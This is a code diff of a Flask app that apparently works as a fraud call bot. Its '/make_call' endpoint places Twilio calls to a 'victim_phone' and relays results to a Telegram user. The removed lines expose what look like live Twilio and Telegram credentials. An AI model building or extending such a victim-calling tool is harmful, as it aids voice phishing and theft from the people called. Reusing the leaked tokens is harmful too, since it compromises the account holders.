@@ -1,16 +1,17 @@
+import os
 import requests
 from flask import Flask, request
 from twilio.rest import Client
 
 app = Flask(__name__)
 
-# Twilio Credentials
-TWILIO_ACCOUNT_SID = "ACa95e412bd2f89e6016795155b33cc34f"  # Your Twilio Account SID
-TWILIO_AUTH_TOKEN = "17e364eb5393c010664780dbfa3da057"  # Your Twilio Auth Token
-TWILIO_PHONE_NUMBER = "+18253600119"  # Your Twilio phone number
+# Use environment variables to store sensitive information
+TWILIO_ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID")  # Get from environment variable
+TWILIO_AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN")    # Get from environment variable
+TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER")  # Get from environment variable
 
 # Telegram Bot Token
-TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")  # Get from environment variable
 
 @app.route('/twilio_webhook', methods=['POST'])
 def twilio_webhook():
@@ -43,7 +44,6 @@ def twilio_webhook():
     
     return 'OK', 200  # Return acknowledgment
 
-
 def send_telegram_message(user_id, message):
     """Send a message to the Telegram user."""
     url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
@@ -53,11 +53,9 @@ def send_telegram_message(user_id, message):
     print(response.status_code)
     print(response.text)
 
-
 @app.route('/make_call', methods=['POST'])
 def make_call():
     """Initiates a call via Twilio."""
-    # Extract victim's phone number and Telegram user ID from the form data
     victim_phone = request.form.get('victim_phone')
     telegram_user_id = request.form.get('telegram_user_id')
 
